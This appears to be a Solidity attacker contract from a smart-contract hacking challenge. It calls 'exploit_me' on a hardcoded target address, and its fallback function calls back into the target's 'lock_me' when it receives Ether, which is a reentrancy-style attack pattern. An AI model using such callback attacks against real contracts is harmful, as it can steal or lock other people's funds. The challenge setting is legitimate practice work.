// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;
interface ICounter {
    function exploit_me(address winner) external;
    function lock_me() external;
}

contract hellohowareyouimunderthewaterheretoomuchraininguwu {
    
    function hackerman(address _winner) public{
        ICounter(0xcD7AB80Da7C893f86fA8deDDf862b74D94f4478E).exploit_me(_winner);
    }

    fallback() external payable {
           ICounter(0xcD7AB80Da7C893f86fA8deDDf862b74D94f4478E).lock_me();
    }


}